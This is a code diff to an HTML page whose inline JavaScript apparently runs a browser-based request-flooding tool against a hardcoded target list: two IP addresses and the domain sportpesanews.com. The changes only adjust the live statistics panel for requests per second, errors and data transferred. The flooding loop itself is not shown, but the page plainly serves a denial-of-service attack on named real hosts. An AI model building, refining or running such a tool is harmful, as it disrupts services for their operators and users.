@@ -22,6 +22,7 @@
       height: 100%;
       background-color: rgba(0, 0, 0, 0.5);
       z-index: 1000;
+      overflow-y: auto;
     }
     .modal-content {
       background-color: #fff;
@@ -48,7 +49,7 @@
   </style>
   <script>
     let worker;
-    const urls = ['https://41.76.172.188','https://www.sportpesanews.com','https://196.13.121.8/']; // Global variable for target URLs
+    const urls = ['https://41.76.172.188','https://www.sportpesanews.com','https://196.13.121.8/'];
 
     function getPublicIP() {
       $.getJSON("https://api.ipify.org?format=json", function(data) {
@@ -154,7 +155,7 @@
           postMessage({ lastSecondRequests, lastSecondErrors, dataTransferred, targets });
           lastSecondRequests = 0;
           lastSecondErrors = 0;
-        }, 1000);
+        }, 1500); // Update every 1.5 seconds
       `;
       const blob = new Blob([workerScript], { type: 'application/javascript' });
       worker = new Worker(URL.createObjectURL(blob));
@@ -163,10 +164,10 @@
         const { totalrequests, totalerrors, lastSecondRequests, lastSecondErrors, dataTransferred, targets } = event.data;
         document.querySelector("#totalrequests").innerText = totalrequests;
         document.querySelector("#totalerrors").innerText = totalerrors;
-        document.querySelector("#requestsPerSecond").innerText = lastSecondRequests / 2; // Adjusted to show requests per second
-        document.querySelector("#successPerSecond").innerText = (lastSecondRequests - lastSecondErrors) / 2; // Adjusted to show successful requests per second
-        document.querySelector("#errorsPerSecond").innerText = lastSecondErrors / 2; // Adjusted to show errors per second
-        document.querySelector("#betabox .number-counter").innerText = dataTransferred.toFixed(3);
+        document.querySelector("#requestsPerSecond").innerText = (lastSecondRequests / 1.5).toFixed(1);
+        document.querySelector("#successPerSecond").innerText = ((lastSecondRequests - lastSecondErrors) / 1.5).toFixed(1);
+        document.querySelector("#errorsPerSecond").innerText = (lastSecondErrors / 1.5).toFixed(1);
+        document.querySelector("#betabox .number-counter").innerText = Math.floor(dataTransferred);
         
         Object.keys(targets).forEach((url, n) => {
           var requests_cell = document.querySelector(`#target${n} .requests`);
